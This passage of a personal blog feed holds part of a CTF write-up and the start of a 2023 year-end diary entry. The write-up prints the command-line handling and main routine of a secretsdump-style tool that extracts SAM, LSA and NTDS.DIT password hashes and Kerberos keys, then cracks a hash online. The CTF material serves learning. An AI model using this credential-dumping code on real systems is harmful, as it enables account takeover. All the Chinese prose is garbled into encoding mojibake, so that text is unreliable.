class="hljs-built_in">help</span>=<span class="hljs-string">&quot;SECURITY hive to parse&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-sam&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;SAM hive to parse&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-ntds&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;NTDS.DIT file to parse&quot;</span>)<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-resumefile&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;resume file name to resume NTDS.DIT session dump (only &quot;</span><br>        <span class="hljs-string">&quot;available to DRSUAPI approach). This file will also be used to keep updating the session&#x27;s &quot;</span><br>        <span class="hljs-string">&quot;state&quot;</span>,<br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-outputfile&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;base output filename. Extensions will be added for sam, secrets, cached and ntds&quot;</span>,<br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-use-vss&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Use the VSS method insead of default DRSUAPI&quot;</span>,<br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-exec-method&quot;</span>,<br>        choices=[<span class="hljs-string">&quot;smbexec&quot;</span>, <span class="hljs-string">&quot;wmiexec&quot;</span>, <span class="hljs-string">&quot;mmcexec&quot;</span>],<br>        nargs=<span class="hljs-string">&quot;?&quot;</span>,<br>        default=<span class="hljs-string">&quot;smbexec&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Remote exec &quot;</span><br>        <span class="hljs-string">&quot;method to use at target (only when using -use-vss). Default: smbexec&quot;</span>,<br>    )<br>    group = parser.add_argument_group(<span class="hljs-string">&quot;display options&quot;</span>)<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-just-dc-user&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;USERNAME&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. &quot;</span><br>        <span class="hljs-string">&quot;Implies also -just-dc switch&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-just-dc&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-just-dc-ntlm&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Extract only NTDS.DIT data (NTLM hashes only)&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-pwd-last-set&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Shows pwdLastSet attribute for each NTDS.DIT account. Doesn&#x27;t apply to -outputfile data&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-user-status&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Display whether or not the user is disabled&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-history&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Dump password history, and LSA secrets OldVal&quot;</span>,<br>    )<br>    group = parser.add_argument_group(<span class="hljs-string">&quot;authentication&quot;</span>)<br><br>    group.add_argument(<br>        <span class="hljs-string">&quot;-hashes&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;LMHASH:NTHASH&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;NTLM hashes, format is LMHASH:NTHASH&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-no-pass&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;don&#x27;t ask for password (useful for -k)&quot;</span><br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-k&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Use Kerberos authentication. Grabs credentials from ccache file &quot;</span><br>        <span class="hljs-string">&quot;(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use&quot;</span><br>        <span class="hljs-string">&quot; the ones specified in the command line&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-aesKey&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;hex key&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;AES key to use for Kerberos Authentication&quot;</span> <span class="hljs-string">&quot; (128 or 256 bits)&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-keytab&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Read keys for SPN from keytab file&quot;</span><br>    )<br>    group = parser.add_argument_group(<span class="hljs-string">&quot;connection&quot;</span>)<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-dc-ip&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;ip address&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;IP Address of the domain controller. If &quot;</span><br>        <span class="hljs-string">&quot;ommited it use the domain part (FQDN) specified in the target parameter&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-target-ip&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;ip address&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;IP Address of the target machine. If omitted it will use whatever was specified as target. &quot;</span><br>        <span class="hljs-string">&quot;This is useful when target is the NetBIOS name and you cannot resolve it&quot;</span>,<br>    )<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">1</span>:<br>        parser.print_help()<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    options = parser.parse_args()<br><br>    <span class="hljs-comment"># Init the example&#x27;s logger theme</span><br>    logger.init(options.ts)<br><br>    <span class="hljs-keyword">if</span> options.debug <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>        logging.getLogger().setLevel(logging.DEBUG)<br>        <span class="hljs-comment"># Print the Library&#x27;s installation path</span><br>        logging.debug(version.getInstallationPath())<br>    <span class="hljs-keyword">else</span>:<br>        logging.getLogger().setLevel(logging.INFO)<br><br>    domain, username, password, remoteName = parse_target(options.target)<br><br>    <span class="hljs-keyword">if</span> options.just_dc_user <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> options.use_vss <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>            logging.error(<span class="hljs-string">&quot;-just-dc-user switch is not supported in VSS mode&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">elif</span> options.resumefile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            logging.error(<br>                <span class="hljs-string">&quot;resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch&quot;</span><br>            )<br>            sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">elif</span> remoteName.upper() == <span class="hljs-string">&quot;LOCAL&quot;</span> <span class="hljs-keyword">and</span> username == <span class="hljs-string">&quot;&quot;</span>:<br>            logging.error(<span class="hljs-string">&quot;-just-dc-user not compatible in LOCAL mode&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Having this switch on implies not asking for anything else.</span><br>            options.just_dc = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">if</span> options.use_vss <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> options.resumefile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        logging.error(<br>            <span class="hljs-string">&quot;resuming a previous NTDS.DIT dump session is not supported in VSS mode&quot;</span><br>        )<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> (<br>        remoteName.upper() == <span class="hljs-string">&quot;LOCAL&quot;</span><br>        <span class="hljs-keyword">and</span> username == <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">and</span> options.resumefile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>    ):<br>        logging.error(<br>            <span class="hljs-string">&quot;resuming a previous NTDS.DIT dump session is not supported in LOCAL mode&quot;</span><br>        )<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> remoteName.upper() == <span class="hljs-string">&quot;LOCAL&quot;</span> <span class="hljs-keyword">and</span> username == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-keyword">if</span> options.system <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> options.bootkey <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            logging.error(<br>                <span class="hljs-string">&quot;Either the SYSTEM hive or bootkey is required for local parsing, check help&quot;</span><br>            )<br>            sys.exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br><br>        <span class="hljs-keyword">if</span> options.target_ip <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            options.target_ip = remoteName<br><br>        <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            domain = <span class="hljs-string">&quot;&quot;</span><br><br>        <span class="hljs-keyword">if</span> options.keytab <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)<br>            options.k = <span class="hljs-literal">True</span><br><br>        <span class="hljs-keyword">if</span> (<br>            password == <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">and</span> username != <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">and</span> options.hashes <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">and</span> options.no_pass <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">and</span> options.aesKey <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br>        ):<br>            <span class="hljs-keyword">from</span> getpass <span class="hljs-keyword">import</span> getpass<br><br>            password = getpass(<span class="hljs-string">&quot;Password:&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> options.aesKey <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            options.k = <span class="hljs-literal">True</span><br><br>    dumper = DumpSecrets(remoteName, username, password, domain, options)<br>    <span class="hljs-keyword">try</span>:<br>        dumper.dump()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">if</span> logging.getLogger().level == logging.DEBUG:<br>            <span class="hljs-keyword">import</span> traceback<br><br>            traceback.print_exc()<br>        logging.error(e)<br></code></pre></td></tr></table></figure></details><p>å¾—åˆ°</p><p><img src="/posts/7bf98902/image-20240221224614445.png" alt="image-20240221224614445"></p><p>ä½¿ç”¨<a href="https://md5decrypt.net/en/Ntlm/">Online NTLM Encrypt and Decrypt (md5decrypt.net)</a></p><p><img src="/posts/7bf98902/image-20240221224836258.png" alt="image-20240221224836258"></p><p>æ‹¼æ¥å¾—åˆ° flag</p><h2 id="ç®€å•çš„å–è¯ï¼Œä¸è¿‡å‰åä¸ªæœ‰çº¢åŒ…"><a href="#ç®€å•çš„å–è¯ï¼Œä¸è¿‡å‰åä¸ªæœ‰çº¢åŒ…" class="headerlink" title="ç®€å•çš„å–è¯ï¼Œä¸è¿‡å‰åä¸ªæœ‰çº¢åŒ…"></a>ç®€å•çš„å–è¯ï¼Œä¸è¿‡å‰åä¸ªæœ‰çº¢åŒ…</h2><p>é€šè¿‡ä¸Šé¢ DiskGenius è®¿é—®æ¡Œé¢å¾—åˆ° </p><p><img src="/posts/7bf98902/secret_password.jpg" alt="secret_password"></p><p>å†ç”¨ VeraCrypt è¾“å…¥å¯†ç æ‰“å¼€å¾—åˆ° flag</p><h2 id="ä¸aièŠå¤©"><a href="#ä¸aièŠå¤©" class="headerlink" title="ä¸aièŠå¤©"></a>ä¸aièŠå¤©</h2><p><img src="/posts/7bf98902/image-20240221225058090.png" alt="image-20240221225058090"></p><h2 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h2><p>å¸ƒå°”ç›²æ³¨</p><p>å®¡è®¡æµé‡ä¸€ä¸ªä¸ªå¾€ä¸‹çœ‹æŠŠ hex è½¬æˆ ASCII å°±æ˜¯</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023å°ç»“</title>
    <link href="/posts/cf791e74/"/>
    <url>/posts/cf791e74/</url>
    
    <content type="html"><![CDATA[<h1 id="éšä¾¿çœ‹çœ‹"><a href="#éšä¾¿çœ‹çœ‹" class="headerlink" title="éšä¾¿çœ‹çœ‹"></a>éšä¾¿çœ‹çœ‹</h1>    <div id="aplayer-bjNSiqzm" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="27785613" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#3F51B5"></div><p><img src="/posts/cf791e74/mmexport1685614332967.jpg" alt="äº”æœˆå¤©"></p><p>â€œæ—¶é—´çš„ç”µå½±ï¼Œç»“å±€æ‰çŸ¥é“â€<br>äººå¥½åƒçœŸçš„åªä¼šè®°å¾—ç¾å¥½çš„ç¬é—´ï¼Œæˆ‘å¾ˆä¸æƒ³å¦å®šå½“æ—¶çš„æ„Ÿå—ï¼Œä½†æ˜¯ç°åœ¨å›æƒ³èµ·æ¥ï¼Œå¥½åƒçœŸçš„ä¸€åˆ‡éƒ½ä¸å€¼ä¸€æï¼Œå†è¿‡ä¸ªå‡ å¹´ï¼Œç­‰åˆ°å¤§å­¦æ¯•ä¸šäº†ï¼Œæ­¥å…¥ç¤¾ä¼šï¼Œä¹Ÿè®¸åˆæœ‰æ–°çš„ä½“ä¼š</p><p>ç°åœ¨çš„æˆ‘å¯ä»¥éšæ—¶åšè‡ªå·±æƒ³å¹²çš„äº‹ï¼Œä¹Ÿå¯ä»¥è½»èˆŸå·²è¿‡é«˜é“ç«™ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸è½»æ¾ï¼Œæ•°ä¸å®Œçš„ddlï¼Œçœ‹ä¸æ‡‚çš„é«˜æ•°ï¼Œæ•²ä¸å®Œçš„ä»£ç ï¼Œæˆ‘å¥½åƒè¢«å›°ä½äº†ï¼Œå›°åœ¨äº†å†™å®Œæœ€åé‚£é“å¤§é¢˜çš„ä¸€åˆ»ã€‚èµ°å‡ºè€ƒåœºï¼Œå¤•é˜³åŠè½ï¼Œä½™æ™–æ´’ä¸‹ï¼Œé«˜ä¸­ä¸‰å¹´éšä¹‹è½å¹•ï¼Œå€šåœ¨å›´æ ä¸Šï¼Œæœ›ç€æ¥æ—¶çš„è‡ªå·±ã€‚å…¶å®ä¹ŸçŸ¥é“è¯»ä¹¦çš„è¿™åå‡ å¹´ä¹Ÿè®¸æ˜¯äººç”Ÿæœ€è½»æ¾çš„é˜¶æ®µï¼Œå¾ˆå•çº¯åœ°è·å–çŸ¥è¯†ï¼Œè€Œä¸æ˜¯åœ¨ç¤¾ä¼šæ‘¸çˆ¬æ»šæ‰“ã€ç¢Œç¢Œæ— ä¸ºï¼Œä½†å¥½åƒæœ‰äº›ä¸œè¥¿ç¡®ç¡®å®å®éœ€è¦æ·±åˆ»çš„ç»å†æ¥é¢†ä¼š<img src="/posts/cf791e74/IMG_4176.JPG" alt="è€ƒå®Œæœ€åä¸€ç§‘"></p><p>â€œæ¬²ä¹°æ¡‚èŠ±åŒè½½é…’ï¼Œç»ˆä¸ä¼¼ï¼Œå°‘å¹´æ¸¸â€<br>å¾€æ—¥çš„æ—§äº¤æ¸è¡Œæ¸è¿œï¼Œå½“ä¸‹çš„äº¤å¾€è¶Šæ¥è¶Šéš¾äº¤å¿ƒï¼Œæˆ‘æ„Ÿè§‰æˆ‘æŒºè™šä¼ªçš„ï¼Œè—ç€æ— æ•°çš„é¢è²Œï¼Œäººå‰ä¸€å¥—äººåä¸€å¥—ï¼Œæˆ‘å¥½åƒå¿«è®¤ä¸æ¸…è‡ªå·±äº†ï¼Œæœ‰æ—¶æ€»æ„Ÿè§‰è‡ªå·±æ˜¯åœ¨é¥°æ¼”è‡ªå·±ã€‚å„¿æ—¶ï¼Œçœ‹ç€çˆ¶äº²ä¸ºäº†åº”é…¬å–çš„é…©é…Šå¤§é†‰ï¼Œå¬ç€æ¯äº²çš„å˜˜å¯’é—®æš–å«Œå…¶å” å¨éš¾å¿ï¼Œå´æ²¡çœ‹å‡ºä»–ä»¬è‚©ä¸Šçš„é‡æ‹…å’Œèº«å¿ƒçš„ç–²æƒ«ã€‚æ—¶å…‰æ€»æ˜¯å‚¬äººè€ã€‚é•¿å¤§çš„ä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç«¥çœŸå’Œæ— å¿§æ— è™‘çš„çŠ¶æ€ï¼Ÿæ›´å¤šçš„è´£ä»»å’Œå‹åŠ›ï¼Ÿè¿˜æ˜¯æˆ‘ä»¬å˜æˆäº†æˆ‘å‘¢ï¼Ÿè¿‡å¹´çƒ§é¦™æ‹œä½›ï¼Œä¹‹å‰çš„æˆ‘æ€»æ˜¯å¸Œæœ›èƒ½è‡ªç”±æ¥å¹´èƒ½æœ‰æ–°æ”¶è·ï¼Œç°åœ¨åªå¸Œæœ›èƒ½å¤Ÿå¹³å®‰å–œä¹ï¼Œä¸å†å¤±å»ä»€ä¹ˆä¾¿æ˜¯æœ€å¤§çš„ç¦æ°”äº†ã€‚</p><p>â€œäººé¢ä¸çŸ¥ä½•å¤„å»ï¼Œæ¡ƒèŠ±ä¾æ—§ç¬‘æ˜¥é£â€<br>é—æ†¾æ€»æ˜¯ä¼´éšç»ˆç”Ÿï¼Œåœ¨æ—¶é—´ä¸­ç©¿è¡Œï¼Œåªç•™ä¸‹æ®‹ç¼ºçš„è„šå°å’Œæ—¶ä¸æ—¶å›å¤´æœ›çš„è‡ªå·±ã€‚ä¸­å­¦æ—¶æœŸæ²¡è°ˆæˆæ‹çˆ±ï¼Œæœ‰ç‚¹å¥½ç¬‘ï¼Œä½†æˆ‘çœŸå¿ƒè§‰å¾—æœ‰äº›é—æ†¾ï¼Œå¥½åƒä»€ä¹ˆä¸å®Œæ•´äº†ï¼Œå‘¨å›´æœ‹å‹è¯´æ²¡è°ˆæ‰æ˜¯å¯¹çš„ï¼Œä¹Ÿè®¸ä»–ä»¬è¯´çš„ä¹Ÿæ²¡é”™å§<br>é—®å°±æ˜¯è®¨åŒå¿«é¤å¼çš„æ‹çˆ±ï¼Œè¦çº¯çˆ±ï¼Œè¦ä¸éšä¾¿ï¼Œè¦soulmateï¼Œä½†å´åˆç¾¡æ…•åˆ«äººçš„æˆåŒæˆå¯¹ï¼Œåˆ«äººæ¢äº†ä¸€å¯¹åˆä¸€å¯¹ï¼Œä½ å¥½åƒä¸€ç›´éƒ½æ˜¯ä¸€ä¸ªäººï¼Œå˜´ä¸Šè¯´ç€æˆ‘è§‰å¾—ä¸€ä¸ªäººä¹ŸæŒºå¥½çš„ï¼Œä¸€ä¸ªäººå°±ä¸€ä¸ªäººå‘—ï¼Œä½†è°ä¸çŸ¥é“è¿™æ˜¯å˜´ç¡¬ç½¢äº†ï¼Œä¹Ÿè®¸å°±æ˜¯æƒ³è¦çš„è¶Šå¤šï¼Œå¤±å»çš„è¶Šå¤šå§<br>ï¼ˆå˜¿å˜¿ï¼Œä¸€å­¦æœŸè·Ÿå¥³å­©è®²çš„è¯è¿˜æ²¡é«˜ä¸­ä¸€èŠ‚è¯¾æ¥çš„å¤š<br>å¾ˆå¤šäººå¯¹æˆ‘çš„è¯„ä»·éƒ½æ˜¯ä¸­å¤®ç©ºè°ƒï¼Œæˆ‘å¥½åƒæ€»èƒ½å¯¹æ¯ä¸ªäººå‡ºæ¼”ä¸åŒçš„è§’è‰²ï¼Œå¥½åƒä¹Ÿè¯´ä¸ä¸Šæ¥ä»€ä¹ˆä¸å¥½<br>æˆ‘æ€»æ˜¯å¤ªå›ºæ‰§ï¼Œå¥½åƒçœŸçš„å¾ˆéš¾åšåˆ°éšå¿ƒè€Œä¸è€ƒè™‘åæœï¼Œå¥½åƒæ€»å›°åœ¨æ— æ„ä¹‰çš„å†…è€—é‡Œï¼Œä½†æ˜¯å®é™…ä¸Šä»¥åçš„äº‹åˆæœ‰è°èƒ½æ–™åˆ°å‘¢<br>æˆ‘å¯¹å–œæ¬¢è¿™ç§æ„Ÿè§‰ä¹Ÿæ€»æ˜¯åçŸ¥åè§‰ï¼Œå¸¸è§‰é—æ†¾ï¼Œä¹Ÿè®¸å°±æ˜¯ç¼˜åˆ†ä¸å¤Ÿå§ã€‚ä½†å³ä½¿å†ç»™æˆ‘å›å»ä¸€æ¬¡çš„æœºä¼šï¼Œä»¥å½“æ—¶çš„å¿ƒæ™ºå’Œé˜…å†æˆ–è®¸è¿˜æ˜¯ä¼šåšå‡ºä¸€æ ·çš„é€‰æ‹©ï¼Œæœ‰äº›è¯å°±æ˜¯ä¸èƒ½è¯´ï¼Œæœ‰äº›è·¯å°±æ˜¯ä¸€å®šå¾—èµ°ã€‚å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œæˆ‘çš„å¿ƒé‡Œè€æ˜¯æ„Ÿè§‰å°‘äº†ä»€ä¹ˆï¼ŒåŸæ¥æ„æ–™ä¹‹ä¸­çš„äº‹ä¹Ÿä¼šéš¾è¿‡è®¸ä¹…<img src="/posts/cf791e74/IMG_4068.PNG" alt="æœ€è¿‘å¾ˆå–œæ¬¢è¿™å¼ "></p><p>â€œæˆ‘çš„äººç”Ÿç›®æ ‡ï¼Œå°±æ˜¯å’Œä½ ç»´æŒç°çŠ¶â€<br>äººç”Ÿå¥½åƒä¸€ä¸ªä¸ªå°å°çš„åœ†åœˆï¼Œæ¯ä¸ªäººç©·ææ‰€æœ‰ä¸°å¯Œè‡ªå·±çš„æƒ…æ„Ÿã€ç²¾ç¥ã€ç»å†ï¼Œæ‰©å¼ è‡ªå·±çš„å°é¢†åŸŸã€‚ç›¸é‡å°±åƒæ— æ•°ä¸ªåœ†åœˆçš„äº¤é›†ï¼Œæˆ‘ä»¬åœ¨æ‘¸ç´¢ä¸­ç›¸è¯†ç›¸çŸ¥ï¼Œå¦‚æœè¶³å¤Ÿå¹¸è¿çš„è¯ï¼Œè¿™ä¸ªåœˆå­ä¾¿ä¸æ–­æ‰©å¤§ï¼Œäº’ç›¸ä¾èµ–ã€‚ä½†å¤§éƒ¨åˆ†æ—¶é—´é‡Œï¼Œå°å°çš„äº¤é›†æ€»æœ‰ä¸€å¤©ä¼šå¡«æ»¡ï¼Œäºæ˜¯ä¾¿åªèƒ½è¿ˆå…¥åˆ«çš„æ–°çš„æ›´é²œæ´»çš„åœˆå­ï¼Œä¾¿è¿æ¥äº†åˆ†ç¦»ï¼Œä½†è¿™ç§çŠ¶æ€å¾€å¾€éš¾ä»¥æ‰æ‘¸ã€‚æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬æ— æ³•é¢„ä¼°ä¸€ä¸ªç¬é—´çš„ä»·å€¼ç›´åˆ°å®ƒæˆä¸ºå›å¿†ï¼Œå›é¦–ï¼Œä¸€åˆ‡å°½åœ¨ä¸è¨€ä¸­ï¼Œè€Œäººå‘¢ï¼Œå´æ€»æ˜¯åçŸ¥åè§‰ã€‚æ¯•ç«Ÿï¼Œè°èƒ½æ–™åˆ°åæ¥çš„äº‹å‘¢ï¼Œæ„å¤–ä¸æ€»æ˜¯ä¸æœŸè€Œé‡å—ï¼Œå„¿æ—¶çš„é£å†ä¹Ÿå¹ä¸åˆ°ç°åœ¨äº†</p><p>ä¸­å­¦æ—¶æœŸçš„å‹æƒ…ä¼¼ä¹éƒ½æ˜¯è¢«è¿«äº§ç”Ÿçš„ï¼Œè¢«ç»‘å®šåœ¨ä¸€ä¸ªå›ºå®šçš„åœºæ‰€ï¼Œä¸€ä¸ªåŸå¸‚ã€ä¸€åº§å­¦æ ¡ã€ä¸€é—´æ•™å®¤â€¦è°ä¹Ÿä¸çŸ¥é“ç¦»å¼€äº†è¿™ä¸ªåœ°æ–¹ï¼Œè¿™ä»½æƒ…è°Šæ˜¯ä¸æ˜¯ä¹Ÿè·Ÿç€æ•£äº†ï¼Œä¹Ÿè®¸å¾ˆå¤šäººæ¯•ä¸šå…¸ç¤¼ä¾¿æ˜¯äº’ç›¸çš„æœ€åä¸€é¢äº†ã€‚å–æ¶ˆäº†ç½®é¡¶ï¼Œæ²‰å¯‚çš„èŠå¤©æ¡†é€æ¸åˆ·ä¸‹ï¼Œå¾€æ—¥çƒ­æƒ…çš„è¯è¯­ä¹Ÿå˜æˆäº†å†·å†°å†°çš„æ•°æ®ä¸¢åœ¨äº†æ‰‹æœºçš„çŠ„è§’æ—®æ—¯é‡Œã€‚ä¸€åˆ‡ä¼¼ä¹åœ¨æ‰€éš¾å…ï¼Œä¹Ÿéƒ½çŸ¥é“æ˜¯é˜¶æ®µæ€§å‹è°Šï¼Œä¹ŸçŸ¥é“æ€ä¹ˆå¯èƒ½ä¼šæœ‰äººçœŸçš„ä¸€æˆä¸å˜çš„é™ªä¸€ä½ ä¸€è¾ˆå­å‘¢ï¼Œä½†å°±æ˜¯éš¾ä»¥æ¥å—ï¼Œä¹Ÿè®¸è‡ªå·±å°±æ˜¯é‚£ä¸ªå¹¸å­˜è€…å‘¢ã€‚åŒä¸€ä¸ªä¸–ç•Œé‡Œï¼Œç»å†ç€ä¸åŒçš„äººç”Ÿï¼Œä½ ä¹Ÿå¾ˆéš¾è¯´ä»¥åä¼šä¸ä¼šå†ç›¸é‡ï¼Œå†ç›¸é‡åˆä¼šæ˜¯åœ¨ä»€ä¹ˆæ ·çš„åœºæ™¯ä¸‹ï¼Œä¹Ÿè®¸å†æèµ·å¯¹æ–¹å·²æ˜¯è¿åå¸¦å§“<br>æ”¾å‡å…´èµ·å›åˆ°é«˜ä¸­ï¼Œæƒ³è¦åˆ°å¤„èµ°èµ°çœ‹çœ‹å¾€æ—¥çš„ç—•è¿¹ï¼Œæ™ƒæ™ƒæ‚ æ‚ ä¸­ï¼Œä¼¼ä¹ä¹Ÿæ²¡æœ‰æˆ‘èƒ½å¤Ÿè½è„šçš„åœ°æ–¹äº†ï¼Œä¸€åˆ‡éƒ½å˜äº†æ¨¡æ ·ï¼Œæ–°çš„é’æ˜¥æ°”æ¯æ‰‘é¢è€Œæ¥ï¼Œä¸€åˆ‡ä¹Ÿéƒ½ä¸å†å±äºæˆ‘ã€‚ææƒšé—´ï¼Œåƒæ˜¯åšäº†ä¸€åœºæ¢¦ï¼Œç†Ÿæ‚‰çš„åœ°æ–¹è—ç€æ— äººé—®æ´¥çš„å›å¿†ï¼Œæ—¶é—´ä¸€ç›´åœ¨èµ°ï¼Œä½ å´æ— èƒ½ä¸ºåŠ›<br>æœ‰æ—¶å€™ä¹Ÿä¼šæƒ³è¦æ˜¯é«˜ä¸‰å¦‚æœæ²¡æ¢åœ°æ–¹ä¼šæ€æ ·ï¼Œä¸å¯¹ï¼Œæˆ‘ä¸æ•¢æƒ³</p><p>å¶ç„¶é—´ç©¿ä¸Šç–«æƒ…æ—¶ç©¿è¿‡çš„è¡£æœï¼Œæ‰‹ä¹ 